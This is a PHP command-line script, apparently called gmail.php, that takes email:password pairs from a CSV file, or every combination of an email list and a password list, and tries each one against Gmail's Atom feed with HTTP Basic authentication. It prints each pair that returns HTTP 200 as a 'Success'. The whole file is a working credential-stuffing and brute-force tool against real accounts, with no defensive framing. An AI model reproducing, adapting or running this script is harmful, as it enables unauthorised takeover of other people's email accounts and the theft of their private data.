<?php

if ($argc < 2) {
	echo "\nUsage 1: php gmail.php csv /path/to/csv_file.txt\n\n";
	echo "Usage 2: php gmail.php two_files /path/to/email_list.txt /path/to/password_list.txt\n\n";
	exit;
}

$type = $argv[1];
if($type == 'csv' and count($argv) >= 3) {
	$file = $argv[2];
	$fh = fopen($file,"r");
	while (!feof($fh)) {
		$plain = trim(str_replace(',', ':', fgets($fh)));
        if (strlen($plain) > 3) {
            $encoded = base64_encode($plain);
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_HTTPHEADER, array('Authorization: Basic ' . $encoded));
            curl_setopt($curl, CURLOPT_URL, 'https://mail.google.com/mail/feed/atom');
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            $xml = curl_exec($curl);
            $http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            if ($xml === false) {
                die('Error fetching data: ' . curl_error($curl));
            }
            curl_close($curl);
	        if($http_code == 200) {
				echo "\033[0;32mSuccess for ".$plain."\033[0m \n";
			}
        }
	}
}

else if($type == 'csv' and $argc == 2) {
	echo "\nUsage: php gmail.php csv /path/to/csv_file.txt\n\n";
}


if($type == 'two_files' and count($argv) > 3) {
$file_users = $argv[2];
$file_passes = $argv[3];
$fhu = fopen($file_users,"r");
while (!feof($fhu)) {
		$plain_user = trim(str_replace(PHP_EOL, '', fgets($fhu)));
		$fhp = fopen($file_passes,"r");
	
		while (!feof($fhp)) {
			$plain_pass = trim(str_replace(PHP_EOL, '', fgets($fhp)));
			$plain = $plain_user.":".$plain_pass;
		
			$len_u = strlen($plain_user);
			$len_p = strlen($plain_pass);
		
			if(($len_u > 0) && ($len_p > 0)){
				$encoded = base64_encode($plain);
				$curl = curl_init();
				curl_setopt($curl,CURLOPT_HTTPHEADER,array('Authorization: Basic '.$encoded));
				curl_setopt ($curl, CURLOPT_URL, 'https://mail.google.com/mail/feed/atom');
				curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
				$xml = curl_exec ($curl);
				$http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
				if ($xml === false) {
					die('Error fetching data: ' . curl_error($curl));
				}
				curl_close ($curl);
				if($http_code == 200) {
					echo "\033[0;32mSuccess for ".$plain."\033[0m \n";
				}
			}
		}
	}
}
else if($type == 'two_files') {
	echo "\n\nUsage: php gmail.php two_files /path/to/email_list.txt /path/to/password_list.txt\n\n";
}
?>
